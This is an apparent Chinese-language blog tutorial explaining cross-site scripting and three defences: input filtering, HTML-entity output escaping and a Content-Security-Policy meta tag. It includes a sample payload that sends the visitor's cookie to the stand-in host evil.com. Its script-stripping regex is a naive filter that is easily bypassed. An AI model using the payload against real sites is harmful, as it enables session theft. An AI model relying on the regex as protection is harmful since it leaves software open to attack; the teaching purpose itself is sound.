# XSS 防護：保護你的網站不被劫持

在網路世界中，保護你的網站免於受到黑客的攻擊是一項重要的任務。其中，最常見的攻擊方式之一就是跨網站腳本攻擊，簡稱XSS。在這篇文章中，我將為你介紹什麼是XSS攻擊，以及如何防禦它。

## 了解 XSS 攻擊

XSS攻擊其實就是在網頁中嵌入惡意的JavaScript程式碼，當其他使用者瀏覽該網頁時，這段惡意的程式碼就會被執行，從而達到攻擊的目的。這種攻擊方式的威力非常大，可以用來竊取使用者的密碼、偷取使用者的個人資料，甚至可以控制使用者的瀏覽器。

範例：
```html
<script>document.location='http://www.evil.com?cookie='+document.cookie</script>
```
上面的程式碼會把使用者的cookie資料發送到惡意網站，讓黑客可以利用這些資料進行攻擊。

## 如何防禦 XSS 攻擊

要防禦XSS攻擊，主要有以下幾種方式：

1. 適當地過濾輸入：當使用者輸入文字時，應該將其視為純文字，而不是程式碼。這可以避免黑客嵌入惡意的程式碼。

範例：
```javascript
let userInput = "<script>evil script</script>";
let safeInput = userInput.replace(/<script.*?>.*?<\/script>/gi, "");
```
2. 適當地處理輸出：在將文字顯示到瀏覽器時，應該使用適當的方式來處理特殊字符，例如，可以使用HTML實體來代替特殊字符。

範例：
```javascript
let userInput = "<img src='http://evil.com/evil.jpg'>";
let safeOutput = userInput.replace(/</g, "&lt;").replace(/>/g, "&gt;");
```
3. 使用內容安全政策（CSP）：CSP是一種瀏覽器的安全特性，可以限制網頁中可以執行的程式碼。例如，你可以設定CSP只允許執行來自你自己網站的程式碼，而不允許執行來自其他網站的程式碼。

範例：
```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
```
以上，就是關於XSS攻擊以及如何防禦的一些基本知識。希望透過這篇文章，你能更加了解網路安全，並且可以適當地保護你的網站免受攻擊。在網路世界中，保護好自己，也就是保護好其他人。